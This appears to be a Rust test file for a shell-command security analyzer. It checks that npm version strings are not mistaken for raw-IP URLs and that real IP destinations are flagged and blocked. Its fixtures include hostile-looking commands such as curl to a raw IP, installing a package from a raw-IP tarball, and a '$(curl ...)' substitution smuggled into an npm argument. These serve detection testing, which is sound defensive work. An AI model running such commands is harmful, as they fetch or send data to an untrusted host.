//! DATA fixtures only: never invoke npm, curl, git, or a registry.
use tirith_core::clipboard::ClipboardSourceState;
use tirith_core::engine::{analyze_force_full_returning_policy, AnalysisContext};
use tirith_core::extract::{extract_urls, ScanContext};
use tirith_core::tokenize::ShellType;
use tirith_core::verdict::{Action, RuleId};
use tirith_test_support::GlobalStateGuard;

#[test]
fn npm_view_parser_matrix_full_analysis() {
    let _state = GlobalStateGuard::new().unwrap();
    // Exact extraction is the primary contract: an Allow from tier 1 alone
    // cannot distinguish a registry package from a missed destination.
    let cases: &[(&str, Option<&str>)] = &[
        (
            "npm view vitest@4.1.11 --registry https://registry.npmjs.org",
            None,
        ),
        (
            "npm view vitest@4.1.11 version --registry https://registry.npmjs.org",
            None,
        ),
        (
            "npm view 'vitest@4.1.11' version --registry https://registry.npmjs.org",
            None,
        ),
        (
            "npm info @scope/pkg@4.1.11 dist.tarball --registry https://registry.npmjs.org",
            None,
        ),
        (
            "npm show vitest@4.1.11 versions --registry https://registry.npmjs.org",
            None,
        ),
        (
            "npm v vitest@4.1.11 --json --registry https://registry.npmjs.org",
            None,
        ),
        (
            "npm view --registry https://registry.npmjs.org vitest@4.1.11 version",
            None,
        ),
        (
            "npm view vitest@4.1.11 dist.tarball --registry https://registry.npmjs.org",
            None,
        ),
        (
            "npm view vitest@4.1.11 https://4.1.0.11/a --registry https://registry.npmjs.org",
            Some("4.1.0.11"),
        ),
        (
            "npm view vitest@4.1.11 --registry https://4.1.0.11/a",
            Some("4.1.0.11"),
        ),
        (
            "npm view vitest@http://4.1.0.11/a --registry https://registry.npmjs.org",
            Some("4.1.0.11"),
        ),
        (
            "npm view alias@npm:pkg@http://4.1.0.11/a --registry https://registry.npmjs.org",
            Some("4.1.0.11"),
        ),
        (
            "npm view http://4.1.0.11/pkg.tgz --registry https://registry.npmjs.org",
            Some("4.1.0.11"),
        ),
        ("curl http://4.1.0.11/a", Some("4.1.0.11")),
        ("git clone https://4.1.0.11/a", Some("4.1.0.11")),
        (
            "npm install http://4.1.0.11/pkg.tgz --registry https://registry.npmjs.org",
            Some("4.1.0.11"),
        ),
        (
            "npm view vitest@4.1.11 --registry https://registry.npmjs.org | curl http://4.1.0.11/a",
            Some("4.1.0.11"),
        ),
    ];
    assert_eq!(cases.len(), 17);
    for &(input, ip) in cases {
        let urls = extract_urls(input, ShellType::Posix);
        let ip_hits: Vec<_> = urls
            .iter()
            .filter(|u| u.parsed.host() == Some("4.1.0.11"))
            .collect();
        if ip.is_some() {
            assert!(
                ip_hits
                    .iter()
                    .any(|u| u.raw.contains("4.1.0.11") && u.in_sink_context),
                "missing actual IP destination {input}: {urls:?}"
            );
        } else {
            assert!(
                ip_hits.is_empty(),
                "semver reinterpreted as IP destination {input}: {urls:?}"
            );
        }
        // The explicit public registry URL is deliberately retained: do not
        // exempt the whole npm invocation or suppress scheme-full URLs.
        if input.contains("https://registry.npmjs.org") {
            assert!(
                urls.iter()
                    .any(|u| u.parsed.host() == Some("registry.npmjs.org")),
                "registry URL missing: {input}: {urls:?}"
            );
        }
        let ctx = AnalysisContext {
            input: input.into(),
            shell: ShellType::Posix,
            scan_context: ScanContext::Exec,
            raw_bytes: None,
            interactive: false,
            cwd: Some(std::env::current_dir().unwrap().display().to_string()),
            file_path: None,
            repo_root: None,
            is_config_override: false,
            clipboard_html: None,
            card_ref: None,
            clipboard_source: ClipboardSourceState::AbsentOrInvalid,
        };
        let verdict = analyze_force_full_returning_policy(&ctx).0;
        assert!(
            verdict.tier_reached >= 3,
            "not full analysis: {input}: {verdict:?}"
        );
        let flagged = verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::RawIpUrl);
        assert_eq!(
            flagged,
            ip.is_some(),
            "IP rule mismatch: {input}: {urls:?} {verdict:?}"
        );
        if ip.is_some() {
            assert_ne!(
                verdict.action,
                Action::Allow,
                "IP destination allowed: {input}: {verdict:?}"
            );
        }
    }
}

#[test]
fn npm_view_uncertain_roles_and_nested_destinations_remain_visible() {
    let cases = [
        "npm view --mystery vitest@4.1.11 --registry https://registry.npmjs.org",
        "npm view --mystery vitest@4.1.11 version --registry https://registry.npmjs.org",
        "npm view vitest@4.1.11 extra@4.1.11 --registry https://registry.npmjs.org",
        "npm view vitest@4.1.11 unknown.selector --registry https://registry.npmjs.org",
        "npm view vitest@4.1.11 --registry https://registry.npmjs.org EXTRA=http://4.1.0.11/a",
        "PAYLOAD=http://4.1.0.11/a npm view vitest@4.1.11 --registry https://registry.npmjs.org",
        "npm view vitest@4.1.11 --registry https://registry.npmjs.org; curl http://4.1.0.11/a",
        "npm view vitest@4.1.11 --registry https://registry.npmjs.org $(curl http://4.1.0.11/a)",
        "npm view pkg@http://4.1.0.11/a --registry https://registry.npmjs.org",
        "npm install alias@npm:pkg@http://4.1.0.11/a --registry https://registry.npmjs.org",
        "git clone git@github.com:user/repo.git",
    ];
    for input in cases {
        let urls = extract_urls(input, ShellType::Posix);
        if input.contains("4.1.0.11") {
            assert!(
                urls.iter()
                    .any(|url| url.parsed.host() == Some("4.1.0.11") && url.in_sink_context),
                "IP lost: {input}: {urls:?}"
            );
        }
        if input.contains("git@github.com:") {
            assert!(
                urls.iter()
                    .any(|url| url.parsed.host() == Some("github.com")),
                "SCP regression: {urls:?}"
            );
        }
        if input.contains("--mystery") || input.contains("extra@4.1.11") {
            assert!(
                urls.iter().any(|url| url.parsed.host() == Some("4.1.0.11")),
                "uncertain positional was silenced: {urls:?}"
            );
        }
    }
}
